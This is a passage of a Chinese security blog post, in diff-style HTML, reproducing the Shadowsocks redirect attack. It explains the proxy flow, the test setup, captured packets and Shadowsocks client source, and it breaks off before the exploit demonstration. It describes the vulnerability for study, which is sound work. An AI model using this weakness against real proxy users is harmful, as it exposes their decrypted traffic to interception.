+            <span class="post-title" title="Linux 基础">Linux 基础</span>
+            <span class="post-date" title="2019-09-12 00:17:00">2019/09/12</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2019/08/29/2019第五空间/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2019 第五空间">2019 第五空间</span>
+            <span class="post-date" title="2019-08-29 12:18:35">2019/08/29</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2019/08/27/2019OGeek/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2019 OGeek">2019 OGeek</span>
+            <span class="post-date" title="2019-08-27 11:02:35">2019/08/27</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2019/08/03/2019De1CTF/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2019 De1CTF">2019 De1CTF</span>
+            <span class="post-date" title="2019-08-03 22:14:55">2019/08/03</span>
+        </a>
+        
+        <a  class="小书屋 "
+           href="/2019/08/02/三体/"
+           data-tag="book"
+           data-author="Van1sh" >
+            <span class="post-title" title="三体">三体</span>
+            <span class="post-date" title="2019-08-02 12:56:00">2019/08/02</span>
+        </a>
+        
+        <a  class="工具小屋 "
+           href="/2019/07/22/nmap/"
+           data-tag="Nmap"
+           data-author="Van1sh" >
+            <span class="post-title" title="初遇Nmap">初遇Nmap</span>
+            <span class="post-date" title="2019-07-22 16:07:55">2019/07/22</span>
+        </a>
+        
+        <a  class="工具小屋 "
+           href="/2019/07/21/python 正则/"
+           data-tag="python"
+           data-author="Van1sh" >
+            <span class="post-title" title="python 之 正则">python 之 正则</span>
+            <span class="post-date" title="2019-07-21 22:30:35">2019/07/21</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2019/07/15/2019赛博杯/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2019 赛博杯">2019 赛博杯</span>
+            <span class="post-date" title="2019-07-15 16:22:35">2019/07/15</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-Shadowsocks Redirect Attack" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">Shadowsocks Redirect Attack</h1>
+    
+    <div class="article-meta">
+        
+        
+        <span class="author"><a>Van1sh</a></span>
+        
+        
+        <span class="book">
+            
+                <a  data-rel="漏洞小屋">漏洞小屋</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color2">Shadowsocks</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2023-01-31 16:33:57'>2023-01-30 17:14</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:6.7k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#转发流程"><span class="toc-text">转发流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#抓包分析"><span class="toc-text">抓包分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#源码分析"><span class="toc-text">源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#客户端"><span class="toc-text">客户端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#服务端"><span class="toc-text">服务端</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞成因"><span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞演示"><span class="toc-text">漏洞演示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#踩坑记录"><span class="toc-text">踩坑记录</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近复现了一个比较老的洞，因为涉及到密码学相关的攻击，刚好前段时间也在学习通讯协议相关的知识，于是就比较感兴趣。</p>
+<p>先总体概括一下，漏洞成因是因为 Shadowsocks 的作者默认使用了一个不合适的密码组件（使用者是可以自己再重新指定的），导致中间人可以利用 Shadowsocks 的服务端将解密后的流量随意重定向（这样中间人就能看到解密后的流量了）。不过涉及中间人对流量的劫持、篡改、重放，因此在实践操作中利用起来还是比较困难的。</p>
+<p>复现参考的文章是<a href="https://blog.soreatu.com/posts/analyasis-of-shadowsocks-and-related-attack/#redirect-attack，祥哥这篇文章已经是记录的较为详实了，但是在复现过程中自己也是遇到了一些问题，于是在此记录。" target="_blank" rel="noopener">https://blog.soreatu.com/posts/analyasis-of-shadowsocks-and-related-attack/#redirect-attack，祥哥这篇文章已经是记录的较为详实了，但是在复现过程中自己也是遇到了一些问题，于是在此记录。</a></p>
+<h2 id="转发流程"><a href="#转发流程" class="headerlink" title="转发流程"></a>转发流程</h2><p>不论是什么代理工具，总的流程都是一致的，</p>
+<p>在整个框架中，有这么几个角色，分别是用户、目标网站、代理服务器、代理软件。</p>
+<p>然后是这么个场景，用户想访问目标网站，但是由于某些限制用户不能直接访问目标网站，不过用户可以访问代理服务器，而代理服务器可以访问目标网站，于是用户则借用代理软件通过代理服务器来访问目标网站的资源。</p>
+<p>那么用户具体是如何通过代理软件访问到目标网站上的资源呢？首先用户在本地使用代理软件的客户端，在代理服务器上安装使用代理软件的服务端。当用户像请求目标网站时，会设置代理，那么流量就会先经过客户端，客户端里再将流量转发到服务端上，服务端接收到流量后再将流量转发到目标网站上。目标网站收到请求后给出回应到服务端，服务端再将流量转发到客户端，客户端再将流量转发给用户。</p>
+<p>那么存在几个问题，服务端是如何知道用户想要访问的目标网站？客户端传输到服务端的流量是明文传输么？客户端是怎么知道服务端在哪儿的？</p>
+<p>那么针对 Shadowsocks，笔者暂时可以给出这样的回答，客户端在对用户的流量包进行封装的时候，会在最前方加入用户的想访问的目标网站的信息，并且，客户端到服务端的流量都是加密的，而相应的配置用户需要提前在客户端和服务端进行配置，包括服务端所在的ip，端口，服务端和客户端加密使用的密钥，加密使用的密码体制。</p>
+<p>因此我们可以大致画出这样的一个流程图</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">		 		data       	encrypt(<span class="builtin-name">info</span> of target | data) --&gt; cipher</span><br><span class="line">user    --------------------&gt;    client</span><br><span class="line">									|</span><br><span class="line">                    				|</span><br><span class="line">               					(encrypted)</span><br><span class="line">                    				|</span><br><span class="line">                    				V    </span><br><span class="line">target  &lt;--------------------     server</span><br><span class="line">		 		data		decrypt(cipher) --&gt; <span class="builtin-name">info</span> of target | data</span><br></pre></td></tr></table></figure>
+
+<p> 由于客户端肯定是在用户本地，并且请求和返回肯定是在一次连接内，服务端并不需要对消息进行额外的封装（服务端也不知道用户的地址信息），只进行加密</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">		 		data       	decrypt(cipher) --&gt; data</span><br><span class="line">user    &lt;--------------------    client</span><br><span class="line">									^</span><br><span class="line">                    				|</span><br><span class="line">               					(encrypted)</span><br><span class="line">                    				|</span><br><span class="line">                    				|    </span><br><span class="line">target  --------------------&gt;    server</span><br><span class="line">		 		data		encrypt(data) --&gt; cipher</span><br></pre></td></tr></table></figure>
+
+<p>那么作为中间人，正常来说我们是没法知道用户的请求内容和网站的返回内容，因为我们并不知道代理软件所用的加密密钥，也就没法解密流量。</p>
+<p>但是，我们是否有机会在不解密密文的情况下控制明文呢？废话少说，先抓个包看看具体结构再说。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>抓包之前当然是要搭建环境了，本次我们分析的是python版本，所以先下载源码 <a href="https://github.com/shadowsocks/shadowsocks/tree/master" target="_blank" rel="noopener">https://github.com/shadowsocks/shadowsocks/tree/master</a></p>
+<p>然后为了方便，使用下列配置在本地同时开启了客户端和服务端，</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"server"</span>:<span class="string">"127.0.0.1"</span>,</span><br><span class="line">    <span class="attr">"server_port"</span>:<span class="number">8388</span>,</span><br><span class="line">    <span class="attr">"local_port"</span>:<span class="number">1081</span>,</span><br><span class="line">    <span class="attr">"password"</span>:<span class="string">"aes_password"</span>,</span><br><span class="line">    <span class="attr">"timeout"</span>:<span class="number">60</span>,</span><br><span class="line">    <span class="attr">"method"</span>:<span class="string">"aes-256-cfb"</span>,</span><br><span class="line">    <span class="attr">"local_address"</span>:<span class="string">"127.0.0.1"</span>,</span><br><span class="line">    <span class="attr">"fast_open"</span>:<span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后在自己的vps上的8000端口开启了web服务作为目标网站</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">clinet</span>: 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span> 1081</span><br><span class="line"><span class="selector-tag">server</span>: 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span> 8388</span><br><span class="line"><span class="selector-tag">target</span>: <span class="selector-tag">x</span><span class="selector-class">.x</span><span class="selector-class">.x</span><span class="selector-class">.x</span>   8000</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/01/31/Xwt9Sd1vJiQxom6.png" alt></p>
+<h2 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h2><p>尝试使用代理访问vps上的flag文件</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://49.235.117.239:8000/flag.txt"</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    'http':  <span class="string">"socks5://127.0.0.1:1081"</span>,</span><br><span class="line">    'https': <span class="string">"socks5://127.0.0.1:1081"</span></span><br><span class="line">&#125;</span><br><span class="line">resp = requests.get(url, proxies=proxies)</span><br><span class="line">print(resp.content)</span><br></pre></td></tr></table></figure>
+
+<p>wireshak开启抓包，过滤规则为：tcp.flags.push == 1 &amp;&amp; (tcp.port == 1081 || tcp.port == 8388)</p>
+<p><img src="https://s2.loli.net/2023/01/31/sPDRaXLVGY4j1x3.png" alt="image-20230110172722882.png"></p>
+<p>运行脚本得到</p>
+<p><img src="https://s2.loli.net/2023/01/31/Ca6HRsX3bAtEQro.png" alt></p>
+<p>捕获流量如下</p>
+<p><img src="https://s2.loli.net/2023/01/31/fgyspFAS9aP5qtE.png" alt></p>
+<p>根据info我们大致可以判断，</p>
+<ol>
+<li><p>用户（脚本）起了一个1872端口，16578-16584这四个包应该是脚本在和客户端（1081端口）进行socket握手，</p>
+</li>
+<li><p>随后用户向客户端发起了 GET 请求。随后客户端起了一个端口 1873 向服务端（8388端口）发送了流量，根据长度可以看到是多了23个字节，应该是封装+加密，</p>
+</li>
+<li><p>随后（这一部分由于监听网卡的原因在这里没有捕获到）服务端会解密然后向目标网站发送请求，目标网站回复后，服务端进行加密，</p>
+</li>
+<li><p>（16597包）服务端向客户端发送加密流量</p>
+</li>
+<li><p>最后客户端进行解密再向用户发送明文，可以看到解密后长度少了16字节（熟悉分组密码的话大概可以猜到会是少了16字节的iv向量）</p>
+</li>
+</ol>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>在了解到这样一个大致流程之后，我们根据每一个步骤，找到相应的源码，尝试进行更细节的分析。</p>
+<p>首先是和客户端的socket的握手，总共有两次请求和两次应答，分别是</p>
+<ol>
+<li><p>客户端第一次请求，格式为 版本号+方法占用字节+方法，这里我们是 05 01 00</p>
+</li>
+<li><p>服务端第一次回复，格式为 版本号+方法，这里我们是 05  00 ，00 说明 服务端连接无需经过验证</p>
+</li>
+<li><p>客户端第二次请求，格式为 版本号+CMD+保留字段 RSV+目标地址类型 ATYP+ 目标地址 DST.ADDR + 目标端口 DST.PORT，这里我们是</p>
+<p>05 01 00 01 31 eb 75 ef 1f 40，</p>
+<p><strong>版本号是5，01是建立连接，00默认，01说明是IPV4地址类型，0x31,0xeb,0x75,0xef 是 ip 各个端的十六进制，0x1f40 说明是8000端口</strong></p>
+</li>
+<li><p>服务端第二次回复，格式为 版本号+回复字段 REP+保留字段 PSV+目标地址类型 ATYP+ 服务器绑定地址 BND.ADDR + 服务器绑定端口 BND.PORT，这里我们是 05 00 00 01 00 00 00 00 10 10</p>
+<p><strong>版本号是5，00 表示连接成功，默认保留字段00 ，01 说明是IPV4地址，00 00 00 00 说明绑定地址是0.0.0.0，0x1010 绑定的端口是4112（为啥是这个嘞）</strong></p>
+</li>
+</ol>
+<p>那么定位相应源码，首先是local.py:main，会将 tcp_server 加入 loop，随后loop.run</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	...</span><br><span class="line">    dns_resolver = asyncdns.DNSResolver()</span><br><span class="line">    tcp_server = tcprelay.TCPRelay(config, dns_resolver, <span class="literal">True</span>)</span><br><span class="line">    udp_server = udprelay.UDPRelay(config, dns_resolver, <span class="literal">True</span>)</span><br><span class="line">    loop = eventloop.EventLoop()</span><br><span class="line">    dns_resolver.add_to_loop(loop)</span><br><span class="line">    tcp_server.add_to_loop(loop)</span><br><span class="line">    udp_server.add_to_loop(loop)</span><br><span class="line">    ...</span><br><span class="line">    loop.run</span><br></pre></td></tr></table></figure>
+
+<p>定位到eventloop.py:run，会循环获取pool中的事件，获取句柄调用其handle_event方法，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">    events = []</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> self._stopping:</span><br><span class="line">        asap = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            events = self.poll(TIMEOUT_PRECISION)</span><br><span class="line">        <span class="keyword">except</span> (OSError, IOError) <span class="keyword">as</span> e:</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> sock, fd, event <span class="keyword">in</span> events:</span><br><span class="line">            handler = self._fdmap.get(fd, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> handler <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                handler = handler[<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    handler.handle_event(sock, fd, event)</span><br><span class="line">                <span class="keyword">except</span> (OSError, IOError) <span class="keyword">as</span> e:</span><br><span class="line">                    shell.print_exception(e)</span><br></pre></td></tr></table></figure>
+
+<p>这里由于我们发起了tcp连接，所以我们定位tcprelay.py</p>
+<p>看到TCPRelay的初始化方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TCPRelay</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, config, dns_resolver, is_local, stat_callback=None)</span>:</span></span><br><span class="line">		...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> is_local:</span><br><span class="line">            listen_addr = config[<span class="string">'local_address'</span>]</span><br><span class="line">            listen_port = config[<span class="string">'local_port'</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            listen_addr = config[<span class="string">'server'</span>]</span><br><span class="line">            listen_port = config[<span class="string">'server_port'</span>]</span><br><span class="line">        self._listen_port = listen_port</span><br><span class="line"></span><br><span class="line">        addrs = socket.getaddrinfo(listen_addr, listen_port, <span class="number">0</span>,</span><br><span class="line">                                   socket.SOCK_STREAM, socket.SOL_TCP)</span><br><span class="line">        <span class="keyword">if</span> len(addrs) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"can't get addrinfo for %s:%d"</span> %</span><br><span class="line">                            (listen_addr, listen_port))</span><br><span class="line">        af, socktype, proto, canonname, sa = addrs[<span class="number">0</span>]</span><br><span class="line">        server_socket = socket.socket(af, socktype, proto)</span><br><span class="line">        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        server_socket.bind(sa)</span><br><span class="line">        server_socket.setblocking(<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> config[<span class="string">'fast_open'</span>]:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                server_socket.setsockopt(socket.SOL_TCP, <span class="number">23</span>, <span class="number">5</span>)</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                logging.error(<span class="string">'warning: fast open is not available'</span>)</span><br><span class="line">                self._config[<span class="string">'fast_open'</span>] = <span class="literal">False</span></span><br><span class="line">        server_socket.listen(<span class="number">1024</span>)</span><br><span class="line">        self._server_socket = server_socket</span><br><span class="line">        self._stat_callback = stat_callback</span><br></pre></td></tr></table></figure>
+
+<p>会起一个 server_socket 开启监听（等待用户连接）</p>
+<p>当用户连接后，就是我们前面说的，会触发其event_handle方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_event</span><span class="params">(self, sock, fd, event)</span>:</span></span><br><span class="line">    <span class="comment"># handle events and dispatch to handlers</span></span><br><span class="line">    <span class="keyword">if</span> sock:</span><br><span class="line">        logging.log(shell.VERBOSE_LEVEL, <span class="string">'fd %d %s'</span>, fd,</span><br><span class="line">                    eventloop.EVENT_NAMES.get(event, event))</span><br><span class="line">    <span class="keyword">if</span> sock == self._server_socket:</span><br><span class="line">        <span class="keyword">if</span> event &amp; eventloop.POLL_ERR:</span><br><span class="line">            <span class="comment"># TODO</span></span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'server_socket error'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            logging.debug(<span class="string">'accept'</span>)</span><br><span class="line">            conn = self._server_socket.accept()</span><br><span class="line">            TCPRelayHandler(self, self._fd_to_handlers,</span><br><span class="line">                            self._eventloop, conn[<span class="number">0</span>], self._config,</span><br><span class="line">                            self._dns_resolver, self._is_local)</span><br><span class="line">        <span class="keyword">except</span> (OSError, IOError) <span class="keyword">as</span> e:</span><br><span class="line">            error_no = eventloop.errno_from_exception(e)</span><br><span class="line">            <span class="keyword">if</span> error_no <span class="keyword">in</span> (errno.EAGAIN, errno.EINPROGRESS,</span><br><span class="line">                            errno.EWOULDBLOCK):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                shell.print_exception(e)</span><br><span class="line">                <span class="keyword">if</span> self._config[<span class="string">'verbose'</span>]:</span><br><span class="line">                    traceback.print_exc()</span><br></pre></td></tr></table></figure>
+
+<p>此时 sock 是 self._server_socket，一切正常的情况下，就会初始化一个 TCPRelayHandler() 对象，跟过去看他的init方法</p>
+<p>几个重要的点，_stage 初始化为 STAGE_INIT，客户端与用户的连接（local_sock）加入了循环，并且将自身与local_sock绑定</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">self</span>._stage = STAGE_INIT</span><br><span class="line">...</span><br><span class="line">fd_to_handlers[local_sock.fileno()] = <span class="keyword">self</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">loop</span>.add(local_sock, eventloop.POLL_IN | eventloop.POLL_ERR,<span class="keyword">self</span>._server)</span><br></pre></td></tr></table></figure>
+
+<p>然后就又回到loop.run，这一次调用的handler就是local_sock绑定的这个handler（也就是TCPRelayHandler）的handler_event</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_event</span><span class="params">(self, sock, event)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># handle all events in this handler and dispatch them to methods</span></span><br><span class="line">    <span class="keyword">if</span> self._stage == STAGE_DESTROYED:</span><br><span class="line">        logging.debug(<span class="string">'ignore handle_event: destroyed'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># order is important</span></span><br><span class="line">    <span class="keyword">if</span> sock == self._remote_sock:</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> sock == self._local_sock:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> event &amp; eventloop.POLL_ERR:</span><br><span class="line">            self._on_local_error()</span><br><span class="line">            <span class="keyword">if</span> self._stage == STAGE_DESTROYED:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> event &amp; (eventloop.POLL_IN | eventloop.POLL_HUP):</span><br><span class="line">            logging.info(<span class="string">"read from local"</span>)</span><br><span class="line">            self._on_local_read()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> self._stage == STAGE_DESTROYED:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> event &amp; eventloop.POLL_OUT:</span><br><span class="line">            logging.info(<span class="string">"wrting to local"</span>)</span><br><span class="line">            self._on_local_write()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logging.warn(<span class="string">'unknown socket'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>此时，会进入到 self._local_sock 分支，从用户那里读取第一次的握手消息，由于我们的 self._stage = STAGE_INIT</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">_on_local_read</span><span class="params">(self)</span>:</span></span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">          data = self._local_sock.recv(BUF_SIZE)</span><br><span class="line">...</span><br><span class="line">      <span class="keyword">elif</span> is_local <span class="keyword">and</span> self._stage == STAGE_INIT:</span><br><span class="line">          <span class="comment"># TODO check auth method</span></span><br><span class="line">          self._write_to_sock(<span class="string">b'\x05\00'</span>, self._local_sock)</span><br><span class="line">          self._stage = STAGE_ADDR</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line">      ...</span><br></pre></td></tr></table></figure>
+
+<p>显然，这里处理的就是用户第一次请求和客户端第一次应答，然后 self._stage = STAGE_ADDR</p>
+<p>那么再一次获取到用户的请求后，则执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> (is_local <span class="keyword">and</span> self._stage == STAGE_ADDR) <span class="keyword">or</span> \</span><br><span class="line">                (<span class="keyword">not</span> is_local <span class="keyword">and</span> self._stage == STAGE_INIT):</span><br><span class="line">            self._handle_stage_addr(data)</span><br></pre></td></tr></table></figure>
+
+<p>由于这里要根据各种指令以不同方式进行解析，所以重新封装了一个方法，这里我们的CMD是00，也就是请求连接</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">elif</span> cmd == CMD_CONNECT:</span><br><span class="line">                <span class="comment"># just trim VER CMD RSV</span></span><br><span class="line">                data = data[<span class="number">3</span>:]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                logging.error(<span class="string">'unknown command %d'</span>, cmd)</span><br><span class="line">                self.destroy()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        header_result = parse_header(data)</span><br><span class="line">        <span class="keyword">if</span> header_result <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'can not parse header'</span>)</span><br><span class="line">        addrtype, remote_addr, remote_port, header_length = header_result</span><br></pre></td></tr></table></figure>
+
+<p>parse_header是解析地址的方法，具体具体地址类型（ipv4,ipv6,域名）来进行读取</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td 